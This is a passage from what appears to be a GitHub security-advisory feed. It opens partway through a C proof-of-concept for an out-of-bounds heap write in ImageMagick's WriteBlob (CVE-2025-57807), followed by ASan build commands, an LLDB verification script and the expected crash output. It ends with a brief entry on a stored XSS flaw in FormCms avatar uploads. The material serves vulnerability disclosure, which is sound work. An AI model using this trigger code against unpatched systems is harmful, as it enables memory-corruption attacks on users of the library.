AttachBlob(im-&gt;blob, buf, 1); // type=BlobStream, extent=1, offset=0

SetBlobExempt(im, MagickTrue); // don't free our malloc'd buf

  

// Step 1: write 1 byte (creates BlobInfo + sets offset=1)

unsigned char A = 0x42;

(void) WriteBlob(im, 1, &amp;A);

fprintf(stderr, "[+] after 1 byte: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 2: seek way past end without growing capacity

const MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB

(void) SeekBlob(im, big, SEEK_SET);

fprintf(stderr, "[+] after seek: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 3: small write → reallocation grows by quantum+length, not to offset+length

// memcpy then writes to data + offset (OOB)

const unsigned char payload[] = "PWN";

(void) WriteBlob(im, sizeof(payload), payload);

  

// If we get here, it didn't crash

fprintf(stderr, "[-] no crash; check ASan flags.\n");

  

(void) CloseBlob(im);

DestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);

MagickCoreTerminus();

return 0;

}
</code></pre>
<hr>
<p><code>run:</code></p>
<pre><code class="language-bash"># Use the private prefix for pkg-config
export PKG_CONFIG_PATH="$HOME/opt/im-7.1.2-0/lib/pkgconfig:$PKG_CONFIG_PATH"

# Strict ASan for crisp failure
export ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0:fast_unwind_on_malloc=0'

# Compile (static link pulls transitive deps via --static)
clang -std=c11 -g -O1 -fno-omit-frame-pointer -fsanitize=address -o poc poc.c \
  $(pkg-config --cflags MagickCore-7.Q16HDRI) \
  $(pkg-config --static --libs MagickCore-7.Q16HDRI)

# Execute and capture
./poc 2&gt;&amp;1 | tee asan.log
</code></pre>
<p><strong>Expected markers prior to the fault:</strong></p>
<pre><code>[+] after 1 byte: off=1 len=1
[+] after seek:  off=268435456 len=1
</code></pre>
<p>An ASan&nbsp;<strong>WRITE</strong>&nbsp;crash in&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob</code></a>&nbsp;follows (top frames:&nbsp;<code>WriteBlob blob.c:&lt;line&gt;</code>, then&nbsp;<code>_platform_memmove</code>&nbsp;/&nbsp;<code>__sanitizer_internal_memmove</code>).</p>
<hr>
<h2 id="debugger-verification-manual">Debugger Verification (manual)</h2>
<p>LLDB can be used to snapshot the invariants; ASan alone is sufficient.</p>
<pre><code>lldb ./poc
(lldb) settings set use-color false
(lldb) break set -n WriteBlob
(lldb) run

# First stop (prime write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) continue

# Second stop (post-seek write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) expr -- (unsigned long long)image-&gt;blob-&gt;offset + (unsigned long long)length
(lldb) expr -- (void*)((unsigned char*)image-&gt;blob-&gt;data + (size_t)image-&gt;blob-&gt;offset)

# Into the fault; if inside memmove (no locals):
(lldb) bt
(lldb) frame select 1
(lldb) frame var image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum
</code></pre>
<h2 id="expected-at-second-stoptype--blobstream-·-offset-≈-0x10000000-256-mib-·-length-≈-34-·-extent-≈-64-kib-≪-offset--length-·-quantum-≈-128-kib-·-mapped--magickfalse-·-data--offset-far-beyond-base-next-continue-crashes-in-_platform_memmove"><strong>Expected at second stop:</strong><br><code>type = BlobStream</code>&nbsp;·&nbsp;<code>offset ≈ 0x10000000</code>&nbsp;(256 MiB) ·&nbsp;<code>length ≈ 3–4</code>&nbsp;·&nbsp;<code>extent ≈ 64 KiB</code>&nbsp;(≪&nbsp;<code>offset + length</code>) ·&nbsp;<code>quantum ≈ 128 KiB</code>&nbsp;·&nbsp;<code>mapped = MagickFalse</code>&nbsp;·&nbsp;<code>data + offset</code>&nbsp;far beyond base; next&nbsp;<code>continue</code>&nbsp;crashes in&nbsp;<code>_platform_memmove</code>.
    </h2>
<h2 id="credits">Credits</h2>
<p><strong>Reported by:</strong>&nbsp;Lumina Mescuwa</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e">https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57807">https://nvd.nist.gov/vuln/detail/CVE-2025-57807</a></li>
<li><a href="https://github.com/advisories/GHSA-23hg-53q6-hqfg">https://github.com/advisories/GHSA-23hg-53q6-hqfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-23hg-53q6-hqfg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-09-05T20:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[FormCMS] FormCms avatar upload feature has a stored cross-site scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-4fxf-xgrm-8fcj</id>
        <link href="https://github.com/advisories/GHSA-4fxf-xgrm-8fcj"/>
        <updated>2025-08-28T16:47:06.000Z</updated>
        <content type="html"><![CDATA[<p>FormCms v0.5.5 contains a stored cross-site scripting (XSS) vulnerability in the avatar upload feature. Authenticated users can upload .html files containing malicious JavaScript, which are accessible via a public URL. When a privileged user accesses the file, the script executes in their browser context.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-56236">https://nvd.nist.gov/vuln/detail/CVE-2025-56236</a></li>
<li><a href="https://github.com/FormCms/FormCms/issues/27">https://github.com/FormCms/FormCms/issues/27</a></li>
<li><a href="https://github.com/KKC73/me/blob/main/CVE-2025-56236/README.md">https://github.com/KKC73/me/blob/main/CVE-2025-56236/README.md</a></li>
<li><a href="https://github.com/advisories/GHSA-4fxf-xgrm-8fcj">https://github.com/advisories/GHSA-4fxf-xgrm-8fcj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4fxf-xgrm-8fcj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-08-28T15:30:42.000Z</published>
    </entry>
</feed>